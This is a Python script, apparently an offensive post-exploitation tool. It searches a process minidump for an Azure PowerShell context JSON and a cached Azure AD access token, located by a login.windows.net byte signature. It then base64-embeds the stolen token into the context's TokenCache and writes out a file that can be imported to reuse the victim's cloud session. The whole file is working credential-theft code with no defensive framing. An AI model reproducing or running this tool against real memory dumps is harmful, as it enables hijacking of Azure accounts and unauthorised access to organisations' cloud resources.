 # -*- coding: utf-8 -*-

import argparse
import mmap
import json
import base64
import os

'''
	* filename:
		- Name of the file to find data
	
	* bSearchBegin:
		- Bytes used to locate beginning of target data
	
	* bSearchEnd:
		- Bytes used to locate end of target data
	
	* beginDif - (Default=0):
		- Integer to increase/decrease beginning offset
		- Use +/- values to control direction
	
	* endDif - (Default=0):
		- Integer to increase/decrease ending offset
		- Use +/- values to control direction
'''
def find_data(filename, bSearchBegin, bSearchEnd, beginDif=0, endDif=0):
	data = None

	try:
		with open(filename, "rb") as hInFile:
			# Create memory mapped file handle to the open file
			mm = mmap.mmap(hInFile.fileno(), 0, access=mmap.ACCESS_READ)
			
			# Find beginning offset
			begin = mm.find(bSearchBegin) + beginDif

			# Move to start of the context json
			mm.seek(begin)

			# Ensure cursor is at the correct offset
			cur_offset = mm.tell()
			if cur_offset != begin:
				print("[!] Failed to move to context offset")
				mm.close()
				return None, None, None

			# Find end offset
			end = mm.find(bSearchEnd) + endDif

			# Store data between offsets
			data = mm[begin:end]
			
			# Close handle to memory mapped file
			mm.close()

		return begin, end, data

	except Exception as e:
		print(f"[!] Error getting context offset: {str(e)}")
		return None

# Returns Azure Context: encoded Json
def get_azure_context(dmpFile):
	''' Locat Azure Context Json '''
	bSearchBegin = b'\xef\xbb\xbf\x7b\x0d\x0a\x20\x20'
	bSearchEnd   = b'\x7d\x00'

	begin, end, data = find_data(dmpFile, bSearchBegin,
		bSearchEnd, beginDif=3, endDif=1)

	if data != None:
		print(f"[+] Located raw Azure Context Json [ {begin} : {end} ]")
	
	else:
		print("[!] Failed to locate Azure Context Json")
		return None
	
	# Convert raw data to python dictionary
	# Helps ensure the extracted data is actually Json
	try:
		contextJson = data.decode("utf-8")
		contextDict = json.loads(contextJson)

	except Exception as e:
		print(f"[!] Exception parsing raw Azure context data: {str(e)}")
		return None

	return data

# Returns Azure Cached Token: encoded header, encoded Json
def get_azure_cached_token(dmpFile):
	''' Locate Azure Cached Token '''
	bSearchBegin = (b'\x03\x00\x00\x00\x01\x00\x00\x00\x91'
					b'\x01\x68\x74\x74\x70\x73\x3a\x2f\x2f'
					b'\x6c\x6f\x67\x69\x6e\x2e\x77\x69\x6e'
					b'\x64\x6f\x77\x73\x2e\x6e\x65\x74\x2f')
	bSearchEnd   = b'\x7d\x00'

	begin, end, data = find_data(dmpFile, bSearchBegin,
		bSearchEnd, beginDif=0, endDif=1)

	if data != None:
		print(f"[+] Located raw Azure Cached Token [ {begin} : {end} ]")
	
	else:
		print("[!] Failed to locate Azure Cached Token")
		return None, None

	# Get offset from the token header to the token Json
	bJsonTokenBegin = (b'\x3a\x3a\x3a\x30')

	jsonOffset  = data.find(bJsonTokenBegin) + 6
	bHeaderData = data[0:jsonOffset]
	bTokenJson   = data[jsonOffset:]

	# Convert raw json data to python dictionary
	# Helps ensure the extracted data is actually Json
	try:
		tokenJson = bTokenJson.decode("utf-8")
		tokenDict = json.loads(tokenJson)

	except Exception as e:
		print(f"[!] Exception parsing raw Azure token data: {str(e)}")
		print(f"\n\njsonOffset: {jsonOffset}\n\n")
		print(f"\n\nbHeaderData:\n{bHeaderData}\n\n")
		print(f"\n\nbTokenJson:\n{bTokenJson}\n\n")
		return None, None

	return bHeaderData, bTokenJson

# Returns Azure Context with embedded cached token: encoded Json
def embed_azure_cached_token(bContextJson, bTokenHeader, bTokenJson):
	''' Embed Cached Token into Azure Context '''
	base64Token = base64.b64encode(bTokenHeader + bTokenJson).decode()

	contextDict = json.loads(bContextJson.decode())
	contextId   = [x for x in contextDict['Contexts'].keys()][0]
	contextDict["Contexts"][contextId]["TokenCache"]["CacheData"] = base64Token

	return json.dumps(contextDict).encode('utf-8')

def main():
	parser = argparse.ArgumentParser()
	
	parser.add_argument("-d", "--dump", dest="minidump",
		help="Target minidump file")
	parser.add_argument("-o", "--outfile", dest="outfile",
		help="File to save extracted Azure Context")
	
	args = parser.parse_args()

	targetDumpFile = args.minidump
	azureContextOutFile = args.outfile

	bContextJson = get_azure_context(targetDumpFile)
	if bContextJson == None:
		print("[!] Failed to extract context Json.")
		os._exit(1)

	bTokenHeader, bTokenJson = get_azure_cached_token(targetDumpFile)
	if bTokenHeader == None:
		print("[!] Failed to extract cached token header.")
		os._exit(1)
	elif bTokenJson == None:
		print("[!] Failed to extract cached token Json.")
		os._exit(1)

	bAzureContext = embed_azure_cached_token(bContextJson, bTokenHeader, bTokenJson)

	with open(azureContextOutFile, "wb") as hAzContextOut:
		hAzContextOut.write(bAzureContext)

	print(f"[+] Exported Token Embedded Azure Context\n\t{azureContextOutFile}")

if __name__ == '__main__':
	main()
